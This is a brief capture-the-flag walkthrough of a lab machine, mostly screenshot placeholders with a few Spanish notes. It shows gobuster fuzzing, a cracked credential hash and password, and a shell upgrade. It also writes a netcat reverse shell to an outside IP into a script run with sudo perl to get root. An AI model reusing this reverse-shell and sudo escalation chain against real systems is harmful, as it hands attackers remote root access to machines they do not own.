# NMAP

![alt text](image.png)

# WEB

![alt text](image-1.png)

# Fuzzing

    gobuster dir -u http://10.10.109.205/ -w /usr/share/wordlists/dirb/common.txt

![alt text](image-2.png)

![alt text](image-3.png)

Hacemos fuzzing a la ruta encontrada

![alt text](image-4.png)

![alt text](image-5.png)

![alt text](image-6.png)

![alt text](image-7.png)

![alt text](image-8.png)

manager

42f749ade7f9e195bf475f37a44cafcb

![alt text](image-9.png)

Password123

![alt text](image-10.png)

![alt text](image-11.png)

![alt text](image-12.png)

    python -c 'import pty; pty.spawn("/bin/bash")'

![alt text](image-13.png)

![alt text](image-14.png)

![alt text](image-15.png)

![alt text](image-16.png)

    echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.67.209 4444 >/tmp/f' > /etc/copy.sh

    sudo /usr/bin/perl /home/itguy/backup.pl

![alt text](image-17.png)

![alt text](image-18.png)

cat /root/root.txt